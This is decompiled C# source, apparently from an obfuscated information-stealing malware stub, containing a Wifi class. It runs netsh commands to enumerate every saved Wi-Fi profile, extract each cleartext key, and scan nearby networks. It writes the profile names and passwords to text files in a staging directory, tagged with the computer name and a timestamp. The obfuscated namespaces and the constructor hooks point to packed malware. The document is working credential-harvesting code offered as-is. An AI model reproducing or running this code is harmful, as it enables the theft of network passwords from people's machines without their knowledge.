using System;
using System.IO;
using System.Linq;
using System.Text;
using dg3ypDAonQcOidMs0w;
using rE4lpnT863QnijKQK5;

namespace Stub
{
	// Token: 0x020000D6 RID: 214
	internal sealed class Wifi
	{
		// Token: 0x0600034F RID: 847 RVA: 0x0001FB6C File Offset: 0x0001DD6C
		private static string[] GetProfiles()
		{
			string[] array2;
			try
			{
				string text = CommandHelper.Run("chcp 65001 && netsh wlan show profile | findstr All", true);
				string[] array = (from line in text.Split(new char[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries)
					select line.Substring(line.LastIndexOf(':') + 1).Trim()).ToArray<string>();
				array2 = array;
			}
			catch (Exception ex)
			{
				Logging.Log("Wifi - GetProfiles: Failed to retrieve WiFi profiles. Error: " + ex.Message, true);
				array2 = Array.Empty<string>();
			}
			return array2;
		}

		// Token: 0x06000350 RID: 848 RVA: 0x0001FBFC File Offset: 0x0001DDFC
		private static string GetPassword(string profile)
		{
			string text2;
			try
			{
				string text = CommandHelper.Run("chcp 65001 && netsh wlan show profile name=\"" + profile + "\" key=clear | findstr Key", true);
				text2 = text.Split(new char[] { ':' }).Last<string>().Trim();
			}
			catch (Exception ex)
			{
				Logging.Log("Wifi - GetPassword: Failed to retrieve password for profile '" + profile + "'. Error: " + ex.Message, true);
				text2 = "Password not found";
			}
			return text2;
		}

		// Token: 0x06000351 RID: 849 RVA: 0x0001FC78 File Offset: 0x0001DE78
		public static void ScanningNetworks()
		{
			try
			{
				string text = CommandHelper.Run("chcp 65001 && netsh wlan show networks mode=bssid", true);
				if (!text.Contains("is not running"))
				{
					File.WriteAllText(Path.Combine(Paths.InitWorkDir(), "ScanningNetworks.txt"), text);
				}
			}
			catch (Exception ex)
			{
				Logging.Log("Wifi - ScanningNetworks: Failed to scan networks. Error: " + ex.Message, true);
			}
		}

		// Token: 0x06000352 RID: 850 RVA: 0x0001FCE4 File Offset: 0x0001DEE4
		public static void SavedNetworks()
		{
			try
			{
				string[] profiles = Wifi.GetProfiles();
				StringBuilder stringBuilder = new StringBuilder();
				foreach (string text in profiles)
				{
					if (!text.Equals("65001"))
					{
						Counter.SavedWifiNetworks++;
						string password = Wifi.GetPassword(text);
						stringBuilder.AppendLine("PROFILE: " + text);
						stringBuilder.AppendLine("PASSWORD: " + password);
						stringBuilder.AppendLine();
					}
				}
				File.WriteAllText(Path.Combine(Paths.InitWorkDir(), "SavedNetworks.txt"), stringBuilder.ToString());
			}
			catch (Exception ex)
			{
				Logging.Log("Wifi - SavedNetworks: Failed to save networks. Error: " + ex.Message, true);
			}
		}

		// Token: 0x06000353 RID: 851 RVA: 0x0001FDAC File Offset: 0x0001DFAC
		public static void ScanAndSaveWifiInformation()
		{
			try
			{
				string text = DateTime.Now.ToString("yyyy-MM-dd_HH.mm.ss");
				string compname = SystemInfo.Compname;
				string text2 = Paths.InitWorkDir();
				Console.WriteLine("Starting WiFi scanning process...");
				Console.WriteLine("Scanning visible networks...");
				Wifi.ScanningNetworks();
				Console.WriteLine("Visible networks scan completed.");
				Console.WriteLine("Retrieving saved networks...");
				Wifi.SavedNetworks();
				Console.WriteLine(string.Format("Saved {0} network profiles.", Counter.SavedWifiNetworks));
				string text3 = Path.Combine(text2, string.Concat(new string[] { "ScanningNetworks_", compname, "_", text, ".txt" }));
				string text4 = Path.Combine(text2, string.Concat(new string[] { "SavedNetworks_", compname, "_", text, ".txt" }));
				Console.WriteLine("\nResults saved to:");
				Console.WriteLine("- Visible networks: " + text3);
				Console.WriteLine("- Saved networks with passwords: " + text4);
			}
			catch (Exception ex)
			{
				Console.WriteLine("Error during WiFi scanning: " + ex.Message);
				Logging.Log("WifiScanner - ScanAndSaveWifiInformation: " + ex.Message, true);
			}
		}

		// Token: 0x06000354 RID: 852 RVA: 0x000038B4 File Offset: 0x00001AB4
		public Wifi()
		{
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			base..ctor();
		}

		// Token: 0x06000355 RID: 853 RVA: 0x000038AD File Offset: 0x00001AAD
		static Wifi()
		{
			WP6RZJql8gZrNhVA9v.prXoP4RuYp();
		}
	}
}
